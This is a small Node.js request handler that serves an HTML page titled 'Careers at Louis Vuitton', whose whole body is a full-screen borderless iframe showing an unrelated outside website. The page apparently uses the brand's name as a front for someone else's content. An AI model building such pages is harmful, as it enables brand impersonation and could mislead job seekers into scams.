module.exports = (req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/html; charset=utf-8"
  });

  res.end(`<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Careers at Louis Vuitton</title>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  overflow: hidden;
}
iframe {
  width: 100%;
  height: 100vh;
  border: none;
  display: block;
}
</style>
</head>
<body>
<iframe src="https://blackdognewmedia.co.uk" loading="lazy" allowfullscreen></iframe>
</body>
</html>`);
};
